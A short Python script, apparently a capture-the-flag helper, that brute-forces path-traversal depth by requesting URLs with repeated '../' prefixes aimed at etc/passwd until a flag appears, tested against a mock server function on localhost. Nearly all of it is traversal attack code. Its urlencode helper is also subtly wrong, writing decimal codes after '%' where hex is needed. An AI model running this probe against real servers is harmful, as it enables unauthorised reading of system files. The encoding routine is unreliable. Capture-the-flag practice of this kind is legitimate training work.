import requests
import string
import typing 


def urlencode(text):
    result = ''
    for t in text:
        if not t in string.ascii_letters + string.digits:
            result += f'%{ord(t)}'
        else:
            result += t
    print(result)
    return result

def get_root(request, url, flag, data={}, header={}, depth=10, os='linux'):
    travel = '../'
    if os == 'linux':
        root = ''
        real = 'etc/passwd'
    for i in range(1, depth):
        path = travel*i+real
        res = request(url.format(path),data=data, header={})
        if flag in res['text']:
            print(res['text'], url.format(path))
            return

def req(url, data, header):
    if '../../../' in url:
        return {'text' : 'DH{You_g0t_1t}'}
    else:
        return{'text' : 'Wrong'}

get_root(req, 'http://localhost?url={}', 'DH')